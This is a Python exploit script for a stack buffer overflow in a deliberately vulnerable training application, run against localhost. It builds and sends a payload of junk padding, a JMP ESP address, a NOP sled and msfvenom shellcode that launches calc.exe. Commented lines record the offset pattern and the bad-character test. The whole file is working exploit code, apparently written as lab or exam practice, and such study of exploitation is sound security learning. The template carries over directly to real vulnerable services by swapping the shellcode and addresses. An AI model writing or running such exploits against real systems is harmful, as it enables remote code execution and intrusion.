# Written By: ReverseThrottle
# Exploiting vulnerable application
# App can be found here - https://github.com/justinsteven/dostackbufferoverflowgood


import socket 

# Server IP & Port
server = '127.0.0.1'
port = 31337

# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a' -f py
buf =  b""
buf += b"\xda\xd8\xb8\xbf\xf4\x88\x8c\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x31\x83\xc2\x04\x31\x42\x14\x03\x42\xab\x16"
buf += b"\x7d\x70\x3b\x54\x7e\x89\xbb\x39\xf6\x6c\x8a\x79\x6c"
buf += b"\xe4\xbc\x49\xe6\xa8\x30\x21\xaa\x58\xc3\x47\x63\x6e"
buf += b"\x64\xed\x55\x41\x75\x5e\xa5\xc0\xf5\x9d\xfa\x22\xc4"
buf += b"\x6d\x0f\x22\x01\x93\xe2\x76\xda\xdf\x51\x67\x6f\x95"
buf += b"\x69\x0c\x23\x3b\xea\xf1\xf3\x3a\xdb\xa7\x88\x64\xfb"
buf += b"\x46\x5d\x1d\xb2\x50\x82\x18\x0c\xea\x70\xd6\x8f\x3a"
buf += b"\x49\x17\x23\x03\x66\xea\x3d\x43\x40\x15\x48\xbd\xb3"
buf += b"\xa8\x4b\x7a\xce\x76\xd9\x99\x68\xfc\x79\x46\x89\xd1"
buf += b"\x1c\x0d\x85\x9e\x6b\x49\x89\x21\xbf\xe1\xb5\xaa\x3e"
buf += b"\x26\x3c\xe8\x64\xe2\x65\xaa\x05\xb3\xc3\x1d\x39\xa3"
buf += b"\xac\xc2\x9f\xaf\x40\x16\x92\xed\x0e\xe9\x20\x88\x7c"
buf += b"\xe9\x3a\x93\xd0\x82\x0b\x18\xbf\xd5\x93\xcb\x84\x2a"
buf += b"\xde\x56\xac\xa2\x87\x02\xed\xae\x37\xf9\x31\xd7\xbb"
buf += b"\x08\xc9\x2c\xa3\x78\xcc\x69\x63\x90\xbc\xe2\x06\x96"
buf += b"\x13\x02\x03\xf5\xf2\x90\xcf\xd4\x91\x10\x75\x29"


# Used to find where EIP was over written
# payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9"

payload = b"A"*146              # Junk data
payload += b"\xc3\x14\x04\x08"  # JMP ESP
payload += b"\xcc"              # Breakpoint
payload += b"\x90"*20           # NOP Sled
payload += buf                  # Calc shellcode from msfvenom

# Bad characters 0x00, 0x0a
# Used to find bad characters within exploit
# bad_chars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
# b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
# b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
# b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
# b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
# b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
# b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
# b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

# Creates socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Creates connection
connect = s.connect((server, port))

# Sends payload
s.send(payload + b'\r\n')

# Prints response
print(s.recv(1024))

# Close socket connection
s.close()
